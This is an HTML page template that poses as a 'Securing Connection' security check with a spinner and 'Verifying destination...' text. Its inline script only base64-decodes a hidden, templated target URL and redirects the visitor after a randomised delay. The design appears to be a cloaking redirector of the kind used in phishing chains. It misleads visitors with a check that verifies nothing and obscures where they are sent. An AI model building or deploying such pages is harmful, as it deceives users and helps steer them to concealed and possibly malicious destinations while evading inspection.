<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Securing Connection...</title>
    <style>
        html, body {
            height: 100% !important;
            width: 100% !important;
            margin: 0 !important;
            padding: 0 !important;
            overflow: hidden;
        }

        body {
            background-color: #0f0c29; 
            background: linear-gradient(to right, #24243e, #302b63, #0f0c29) !important;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #ffffff;
        }

        .card {
            background: rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            text-align: center;
            max-width: 90%;
            width: 350px;
        }

        .loader {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-left-color: #00d2ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            margin: 0 0 10px 0;
            font-weight: 500;
            font-size: 22px;
            letter-spacing: 1px;
        }

        p {
            margin: 0;
            font-size: 14px;
            color: #b8b8b8;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="loader"></div>
        <h2>SECURE CHECK</h2>
        <p>Verifying destination...</p>
    </div>

    <script nonce="{{ nonce }}">
        (function() {
            var _payload = "{{ encoded_target }}";
            
            function _execute() {
                try {
                    var _url = atob(_payload);
                    window.location.replace(_url);
                } catch (e) {
                    console.error("Redirect Error");
                }
            }

            var _delay = Math.floor(Math.random() * 1000) + 1500;
            setTimeout(_execute, _delay);
        })();
    </script>
</body>
</html>
